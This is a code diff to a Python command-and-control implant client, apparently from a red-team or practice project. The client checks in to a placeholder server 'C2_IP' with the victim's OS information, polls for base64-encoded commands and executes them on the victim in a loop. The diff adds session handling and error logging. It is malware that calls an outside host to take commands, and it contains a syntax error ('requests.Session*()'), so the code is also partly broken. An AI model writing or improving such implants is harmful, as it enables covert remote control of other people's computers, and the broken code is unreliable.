@@ -9,7 +9,8 @@ import requests
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s') 
 c2_server = "http://C2_IP"
-token = None
+# token = None
+session = requests.Session*()
 
 def execute_command(cmd):
     '''
@@ -113,12 +114,12 @@ def check_in():
     '''
     ops = find_os()
     data = {
-        'id': 1, 
-        'ops': ops
+        'aid': 1, 
+        'ops': ops['type']
     }
 
     try:
-        resp = requests.post(f"{c2_server}/c2", json=data, verify=False, timeout=10)
+        resp = session.post(f"{c2_server}/overview", json=data, verify=False, timeout=10)
         # verify = false since it is a testing environment - shd be set to true if deployed in prod
 
         if resp.status_code == 200 :
@@ -148,18 +149,9 @@ def get_comms():
     function that calls the valid server endpoint to recieve commands to execute on victim 
     '''
 
-    if not token:
-        logging.error('No token found. Exiting...')
-        return
-
-    data = {
-        'token': token
-    }
-
     try:
-        resp = requests.post(f"{c2_server}/cmd", json=data, verify=False, timeout=10)
+        resp = session.post(f"{c2_server}/cmd", verify=False, timeout=10)
         # verify = false since it is a testing environment - shd be set to true if deployed in prod
-        ops = find_os()
         if resp.status_code == 200:
             data = resp.json()
 
@@ -177,7 +169,6 @@ def get_comms():
                     excode = base64.b64decode(res['code'].encode('utf-8'))
 
                     report = {
-                        'token': token,
 
                         
                     }
@@ -185,10 +176,12 @@ def get_comms():
                     logging.info('No command recieved')
         else:
             logging.error(f'Error occured during command retrieval: {resp.status_code} - {resp.text}')
-
+    except Exception as e:
+        logging.error(f'Error occured during command retrieval: {e}')
     
 if __name__ == '__main__':
     check_in = check_in()
 
     while(check_in):
         get_comms()
+        time.sleep(5)
